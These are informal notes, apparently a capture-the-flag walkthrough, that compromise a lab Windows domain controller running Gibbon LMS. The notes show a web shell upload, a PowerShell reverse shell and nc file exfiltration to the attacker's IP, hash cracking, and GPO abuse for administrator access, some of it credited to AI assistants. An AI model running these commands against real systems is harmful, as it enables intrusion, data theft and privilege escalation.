@@ -1,0 +1,599 @@
+found sntp hash with timeroast-ng
+
+1000:$sntp-ms$fa1e712d28558a0a2f06b0e3b01668d0$1c010ae900000000000a28934c4f434cec2036d184c7d1bb0000000000000000ec206c4f94a573c2ec206c4f94a73c19
+
+full nmap shows a webpage w/ domain http://frizzdc.frizz.htb/home/
+
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
+|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 06:09:00Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+modified hosts
+
+http://frizzdc.frizz.htb/home/
+
+now access webpage
+
+Checking the webpage shows a massive list of potentially b64 encoded strings:
+
+V2FudCB0byBsZWFybiBoYWNraW5n IGJ1dCBkb24ndCB3YW50IHRvIGdv IHRvIGphaWw/IFlvdSdsbCBsZWFy biB0aGUgaW4ncyBhbmQgb3V0cyBv ZiBTeXNjYWxscyBhbmQgWFNTIGZy b20gdGhlIHNhZmV0eSBvZiBpbnRl cm5hdGlvbmFsIHdhdGVycyBhbmQg aXJvbiBjbGFkIGNvbnRyYWN0cyBm cm9tIHlvdXIgY3VzdG9tZXJzLCBy ZXZpZXdlZCBieSBXYWxrZXJ2aWxs ZSdzIGZpbmVzdCBhdHRvcm5leXMu 
+
+checking the sign-in page shows 2 other "artifacts":
+1) azure AD is mentioned
+2) the webpage runs off Gibbon v25.0.00 
+
+immediately an LFI exploit is possible thru a google search
+a POC is found: https://github.com/Zer0F8th/CVE-2023-34598
+
+cloning repo and running the following will exploit:
+
+python3 CVE-2023-34598.py scan http://frizzdc.frizz.htb/Gibbon-LMS/
+
+this will attempt LFI and dump sql stuff frfr
+
+we actually got a sql dump, we can view it in sqlitebrowser (db browser):
+sudo pacman -S sqlitebrowser
+
+checking over the db doesn't show anything to investigate
+
+Chroma found another exploit w/ arbitrary file write that could maybe lead to cmd execution (remote shell against the web server hosting the webpage): https://herolab.usd.de/security-advisories/usd-2023-0025/
+
+Decoding the previous b64 strings reveals this:
+
+Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys.
+
+bruh moment
+
+decided to go crack the sntp hash found from timeroasting in the beginning w/ hashcat + rockyou, didn't work tho cuz hashcat doesn't have support for the module bruh
+
+---
+
+command sent by chroma actually works just very iffy since u need to specify cmd='bla' in browser:
+
+curl -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -H "Host: frizzdc.frizz.htb" --data-urlencode "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K" --data-urlencode "path=shell.php" --data-urlencode "gibbonPersonID=0000000001"
+
+http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=whoami
+>frizz\w.webservice frizz\w.webservice
+
+insane, the shell resets every few minutes so rerun curl
+dir also shows a lot of php and a gibbon.sql file
+
+steps to get ps reverse shell: 
+
+on local machine: nc -nvlp 4444
+
+in web browser: http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.15.51%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+
+WE GOT A SHELL :speaking_head:
+
+type config.php shows:
+
+$databaseServer = 'localhost';
+$databaseUsername = 'MrGibbonsDB';
+$databasePassword = 'MisterGibbs!Parrot!?1';
+$databaseName = 'gibbon';
+
+these are mysql creds!
+
+cd into C:\xampp\mysql\bin and we can use MySQL:
+1) test connectivity to server: .\mysql.exe -h localhost -u MrGibbonsDB -pMisterGibbs!Parrot!?1 gibbon 
+No error so chilling
+2) .\mysql.exe -u MrGibbonsDB -p MisterGibbs!Parrot!?1 -D gibbon -e "SHOW TABLES;" (need to specify commands each time lol)
+
+nothing worked until grok groked it out so hard and gave us this:
+
+& "C:\xampp\mysql\bin\mysql.exe" -h localhost -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;" gibbon
+
+we can see these dbs:
+Database
+gibbon
+information_schema
+test
+
+To view tables: & "C:\xampp\mysql\bin\mysql.exe" -h localhost -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SHOW TABLES;" gibbon
+
+Tables_in_gibbon
+gibbonaction
+gibbonactivity
+gibbonactivityattendance
+gibbonactivityslot
+gibbonactivitystaff
+gibbonactivitystudent
+gibbonactivitytype
+gibbonadmissionsaccount
+gibbonadmissionsapplication
+gibbonalarm
+gibbonalarmconfirm
+gibbonalertlevel
+gibbonapplicationform
+gibbonapplicationformfile
+gibbonapplicationformlink
+gibbonapplicationformrelationship
+gibbonattendancecode
+gibbonattendancelogcourseclass
+gibbonattendancelogformgroup
+gibbonattendancelogperson
+gibbonbehaviour
+gibbonbehaviourletter
+gibboncountry
+gibboncourse
+gibboncourseclass
+gibboncourseclassmap
+gibboncourseclassperson
+gibboncrowdassessdiscuss
+gibboncustomfield
+gibbondataretention
+gibbondaysofweek
+gibbondepartment
+gibbondepartmentresource
+gibbondepartmentstaff
+gibbondiscussion
+gibbondistrict
+gibbonemailtemplate
+gibbonexternalassessment
+gibbonexternalassessmentfield
+gibbonexternalassessmentstudent
+gibbonexternalassessmentstudententry
+gibbonfamily
+gibbonfamilyadult
+gibbonfamilychild
+gibbonfamilyrelationship
+gibbonfamilyupdate
+gibbonfileextension
+gibbonfinancebillingschedule
+gibbonfinancebudget
+gibbonfinancebudgetcycle
+gibbonfinancebudgetcycleallocation
+gibbonfinancebudgetperson
+gibbonfinanceexpense
+gibbonfinanceexpenseapprover
+gibbonfinanceexpenselog
+gibbonfinancefee
+gibbonfinancefeecategory
+gibbonfinanceinvoice
+gibbonfinanceinvoicee
+gibbonfinanceinvoiceeupdate
+gibbonfinanceinvoicefee
+gibbonfirstaid
+gibbonfirstaidfollowup
+gibbonform
+gibbonformfield
+gibbonformgroup
+gibbonformpage
+gibbonformsubmission
+gibbonformupload
+gibbongroup
+gibbongroupperson
+gibbonhook
+gibbonhouse
+gibboni18n
+gibbonin
+gibboninarchive
+gibboninassistant
+gibbonindescriptor
+gibbonininvestigation
+gibbonininvestigationcontribution
+gibboninpersondescriptor
+gibboninternalassessmentcolumn
+gibboninternalassessmententry
+gibbonlanguage
+gibbonlibraryitem
+gibbonlibraryitemevent
+gibbonlibrarytype
+gibbonlog
+gibbonmarkbookcolumn
+gibbonmarkbookentry
+gibbonmarkbooktarget
+gibbonmarkbookweight
+gibbonmedicalcondition
+gibbonmessenger
+gibbonmessengercannedresponse
+gibbonmessengerreceipt
+gibbonmessengertarget
+gibbonmigration
+gibbonmodule
+gibbonnotification
+gibbonnotificationevent
+gibbonnotificationlistener
+gibbonoutcome
+gibbonpayment
+gibbonpermission
+gibbonperson
+gibbonpersonaldocument
+gibbonpersonaldocumenttype
+gibbonpersonmedical
+gibbonpersonmedicalcondition
+gibbonpersonmedicalconditionupdate
+gibbonpersonmedicalupdate
+gibbonpersonreset
+gibbonpersonstatuslog
+gibbonpersonupdate
+gibbonplannerentry
+gibbonplannerentrydiscuss
+gibbonplannerentryguest
+gibbonplannerentryhomework
+gibbonplannerentryoutcome
+gibbonplannerentrystudenthomework
+gibbonplannerentrystudenttracker
+gibbonplannerparentweeklyemailsummary
+gibbonreport
+gibbonreportarchive
+gibbonreportarchiveentry
+gibbonreportingaccess
+gibbonreportingcriteria
+gibbonreportingcriteriatype
+gibbonreportingcycle
+gibbonreportingprogress
+gibbonreportingproof
+gibbonreportingscope
+gibbonreportingvalue
+gibbonreportprototypesection
+gibbonreporttemplate
+gibbonreporttemplatefont
+gibbonreporttemplatesection
+gibbonresource
+gibbonresourcetag
+gibbonrole
+gibbonrubric
+gibbonrubriccell
+gibbonrubriccolumn
+gibbonrubricentry
+gibbonrubricrow
+gibbonscale
+gibbonscalegrade
+gibbonschoolyear
+gibbonschoolyearspecialday
+gibbonschoolyearterm
+gibbonsession
+gibbonsetting
+gibbonspace
+gibbonspaceperson
+gibbonstaff
+gibbonstaffabsence
+gibbonstaffabsencedate
+gibbonstaffabsencetype
+gibbonstaffapplicationform
+gibbonstaffapplicationformfile
+gibbonstaffcontract
+gibbonstaffcoverage
+gibbonstaffcoveragedate
+gibbonstaffduty
+gibbonstaffdutyperson
+gibbonstaffjobopening
+gibbonstaffupdate
+gibbonstring
+gibbonstudentenrolment
+gibbonstudentnote
+gibbonstudentnotecategory
+gibbonsubstitute
+gibbontheme
+gibbontt
+gibbonttcolumn
+gibbonttcolumnrow
+gibbonttday
+gibbonttdaydate
+gibbonttdayrowclass
+gibbonttdayrowclassexception
+gibbonttimport
+gibbonttspacebooking
+gibbonttspacechange
+gibbonunit
+gibbonunitblock
+gibbonunitclass
+gibbonunitclassblock
+gibbonunitoutcome
+gibbonusernameformat
+gibbonyeargroup
+
+The test DB has nothing. information_schema returns:
+
+Tables_in_information_schema
+ALL_PLUGINS
+APPLICABLE_ROLES
+CHARACTER_SETS
+CHECK_CONSTRAINTS
+COLLATIONS
+COLLATION_CHARACTER_SET_APPLICABILITY
+COLUMNS
+COLUMN_PRIVILEGES
+ENABLED_ROLES
+ENGINES
+EVENTS
+FILES
+GLOBAL_STATUS
+GLOBAL_VARIABLES
+KEYWORDS
+KEY_CACHES
+KEY_COLUMN_USAGE
+OPTIMIZER_TRACE
+PARAMETERS
+PARTITIONS
+PLUGINS
+PROCESSLIST
+PROFILING
+REFERENTIAL_CONSTRAINTS
+ROUTINES
+SCHEMATA
+SCHEMA_PRIVILEGES
+SESSION_STATUS
+SESSION_VARIABLES
+STATISTICS
+SQL_FUNCTIONS
+SYSTEM_VARIABLES
+TABLES
+TABLESPACES
+TABLE_CONSTRAINTS
+TABLE_PRIVILEGES
+TRIGGERS
+USER_PRIVILEGES
+VIEWS
+GEOMETRY_COLUMNS
+SPATIAL_REF_SYS
+CLIENT_STATISTICS
+INDEX_STATISTICS
+INNODB_SYS_DATAFILES
+USER_STATISTICS
+INNODB_SYS_TABLESTATS
+INNODB_LOCKS
+INNODB_MUTEXES
+INNODB_CMPMEM
+INNODB_CMP_PER_INDEX
+INNODB_CMP
+INNODB_FT_DELETED
+INNODB_CMP_RESET
+INNODB_LOCK_WAITS
+TABLE_STATISTICS
+INNODB_TABLESPACES_ENCRYPTION
+INNODB_BUFFER_PAGE_LRU
+INNODB_SYS_FIELDS
+INNODB_CMPMEM_RESET
+INNODB_SYS_COLUMNS
+INNODB_FT_INDEX_TABLE
+INNODB_CMP_PER_INDEX_RESET
+user_variables
+INNODB_FT_INDEX_CACHE
+INNODB_SYS_FOREIGN_COLS
+INNODB_FT_BEING_DELETED
+INNODB_BUFFER_POOL_STATS
+INNODB_TRX
+INNODB_SYS_FOREIGN
+INNODB_SYS_TABLES
+INNODB_FT_DEFAULT_STOPWORD
+INNODB_FT_CONFIG
+INNODB_BUFFER_PAGE
+INNODB_SYS_TABLESPACES
+INNODB_METRICS
+INNODB_SYS_INDEXES
+INNODB_SYS_VIRTUAL
+INNODB_TABLESPACES_SCRUBBING
+INNODB_SYS_SEMAPHORE_WAITS
+
+groking it up to figure out wut tables to check out, to dump all fields in each notable table:
+1) & "C:\xampp\mysql\bin\mysql.exe" -h localhost -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonPerson;" gibbon
+
+Immediately we can see some interesting fields like password hashes and emails. There is one user record in this table:
+
+Username: f.frizzle
+Password Hash: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 (likely a salted hash, possibly bcrypt or SHA-256, given its length).
+Email: f.frizzle@frizz.htb
+Role: 001 (likely Administrator, based on gibbonRoleIDPrimary and gibbonRoleIDAll).
+Status: Full (active user).
+
+A salt is found as well: /aACFhikmNopqrRTVz2489
+
+The full hash is hash:salt, in this form: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
+
+Cracking w/ hashcat: hashcat -m 1420 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+Cracking the hash reveals the following: Jenni_Luvs_Magic23
+
+Logging into web frontend w/ these creds
+We can see a message board w/ 14 messages total
+
+We find a "banned password list" with the following passwords:
+--Love
+--Sex
+--God
+--12345
+--password
+--letmein
+--guest
+--god
+--trustno1
+--qwerty
+--rosebud
+--love
+--starwars
+--admin
+--letmein123
+--123456
+--password1
+--Bond007
+--batman
+--spock
+--chewie
+--iloveyou
+--superman
+--dragon
+--open sesame
+--matrix
+--swordfish
+--rosebud
+--godzilla
+--iloveyou2
+--welcome
+--money
+--1234
+--abcd1234
+--asdfgh
+--princess
+--snoopy
+--cookie
+--hello
+--admin123
+--football
+--iloveyou3
+--password123
+--baseball
+--buster
+--michael
+--ncc1701
+--letmeinpls
+--banana
+--whiskey
+--pepper
+--computer
+--swordfish1
+
+Going to system admin page shows the same Gibbon version but also PHP 8.2.12 and MySQL 10.4.32.
+
+Next attempt is to get shell back again but use Enter-PSSession as frizzle to maybe get user.
+
+Enumeration not working cuz krb5 conf not set up. 
+
+--- Moved back to kali VM from arch lol
+
+Chroma suggested krb5.conf:
+[domain_realm]
+    .frizz.htb = FRIZZ.HTB
+    frizz.htb = FRIZZ.HTB
+
+[libdefaults]
+    default_realm = FRIZZ.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = true
+    ticket_lifetime = 24h
+    forwardable = true
+
+[realms]
+    FRIZZ.HTB = {
+        kdc = frizzdc.frizz.htb
+        admin_server = frizzdc.frizz.htb
+        default_domain = frizz.htb
+    }
+    
+Stuff works so les goo!
+
+faketime "$(ntpdate -q frizz.htb | awk '{print $1" "$2}')" getTGT.py frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.10.11.60
+
+export KRB5CCNAME=f.frizzle.ccache
+
+We can actually ssh to the machine cuz 22 is open!
+
+Add this to ssh_config in /etc/ssh cuz gssapi auth no worko:
+Host frizz.htb
+    GSSAPIAuthentication yes
+    GSSAPIDelegateCredentials yes
+    
+ssh f.frizzle@frizz.htb -k
+
+still not working so psexec time:
+psexec.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23@10.10.11.60
+
+failed so lets remake ticket:
+kdestroy
+kinit f.firzzle (pw: Jenni_Luvs_Magic23)
+
+still no worko so give up and enumerate instead:
+nxc smb 10.10.11.60 -k -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -M spider_plus
+
+failed but might just be ticket errors so remake again
+
+--- ssh actually works, chroma got user! /etc/hosts needs dc name first the frizz.htb 2nd. 
+
+Ggs it works bruh
+
+---------------------------------------------------------
+Root flag time
+
+Running dir in Desktop shows: wapt-backup-sunday.7z
+
+we can send it to our kali host: scp .\wapt-backup-sunday.7z kali@10.10.15.51:/home/kali
+
+no worko so we will go ahead and run winpeas on the system: https://github.com/peass-ng/PEASS-ng/releases/tag/20250701-bdcab634
+
+download then set up python web server, then curl the executable on remote shell: curl http://10.10.15.51:8000/winPEASx64.exe -o winpeas.exe
+
+From winpeas we discover:
+- NTLMv2 responses is enforced
+- We found some new users! w.li, h.arm, and M.SchoolBus which is an Administrator! Also d.hudson, k.franklin, and more, but also w.WebService but that's secondary.
+
+To get the 7z archive off the host, we can send a POST request to our own python web server. On windows:
+$url = "http://10.10.15.51:8000/"
+$filePath = "C:\Users\f.frizzle\Desktop\wapt-backup-sunday.7z"
+Invoke-WebRequest -Uri $url -Method POST -InFile $filePath
+
+No work, but smb server will:
+impacket-smbserver share /tmp/share -smb2support
+Copy-Item -Path C:\Users\f.frizzle\Desktop\wapt-backup-sunday.7z -Destination \\10.10.15.51\share\
+
+No worko, give up and enumerate instead.
+ 
+nxc smb 10.10.15.51 -k -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -M spider_plus
+
+failing so decided to move on and try bloodhound ingesting:
+
+sudo faketime "$(ntpdate -q frizz.htb | awk '{print $1" "$2}')" bloodhound-python -d frizz.htb -u f.frizzle@frizz.htb -p Jenni_Luvs_Magic23 -c all -ns 10.10.11.60
+
+it worked! now setup bloodhound, ingestion worked too!
+
+Notes about f.frizzle:
+- Literally nothing except remote management user lol
+
+Back to trying to get the 7z archive, we can try using netcat. nc.exe is already on the kali machine in /usr/share/windows-binaries/ lol:
+cp /usr/share/windows-binaries/nc.exe .
+python3 -m http.server
+On Windows: curl http://10.10.15.51:8000/nc.exe -o nc.exe
+nc.exe 10.10.15.51 4444 < .\wapt-backup-sunday.7z
+
+Shows an error on windows but shows up on kali?
+File is 0 bytes in size, retry w/ port 80?
+
+Nope, just change command to work w/ PS: Get-Content -Raw -Path .\wapt-backup-sunday.7z | .\nc.exe 10.10.15.51 4444 
+
+IT WORKS!
+
+now: sudo 7za x wapt-backup-sunday.7z
+The file is either 1) corrupt 2) password protected or 3) not at all a 7z archive even though we can see the magic number AND 7z ascii in the first few bytes.
+
+Using 7z2john to get pw hash?
+7z2john wapt-backup-sunday.7z
+
+--- the 7z is very unstable, but we are on the right track. There is supposedly a password inside a config file inside the archive.
+
+We can get creds for the M.SchoolBus user inside this config file! Pw: !suBcig@MehTed!R
+
+This would be found by spraying the password against all accounts in the domain, since there was no lockout specified in the password policy found w/ WinPEAS.
+
+Now we can SSH w/ M.SchoolBus:
+sudo ntpdate frizz.htb
+kinit M.SchoolBus 
+password: !suBcig@MehTed!R
+
+Suggested by chroma:
+sudo faketime "$(ntpdate -q frizz.htb | awk '{print $1" "$2}')" ssh -o PreferredAuthentications=gssapi-with-mic -o GSSAPIAuthentication=yes M.SchoolBus@frizzdc.frizz.htb
+
+--- Path to root is far deeper cuz there is actually GPO Abuse that is possible for M.SchoolBus, as suggested in BloodHound. We can use SharpGPOAbuse and RunasCs to 1) Abuse GPO privs and make it so we can be a Local Administrator and 2) Run RunasCs to basically become Administrator without needing to authenticate and 'cat' out the root flag lol.
+
+python3 -m http.server
+
+iwr http://10.10.15.51:8000/SharpGPOAbuse.exe -outfile SharpGPOAbuse.exe
+iwr http://10.10.15.51/RunasCs.exe -outfile RunasCs.exe
+
+$gpo = New-GPO -Name "EvilPolicy" && New-GPLink -Name "EvilPolicy" -Target "OU=Domain Controllers,DC=frizz,DC=htb" && New-GPLink -Name "EvilPolicy" -Target "OU=CLASS_FRIZZ,DC=frizz,DC=htb" && .\SharpGPOAbuse.exe --AddlocalAdmin --UserAccount "M.SchoolBus" --GPOName "EvilPolicy"
+
+gpupdate /force
+net localgroup Administrators
+.\RunasCs.exe M.SchoolBus "!suBcig@MehTed!R" "cmd /c whoami && type C:\Users\Administrator\Desktop\root.txt" -l 2 -f 2 --bypass-uac
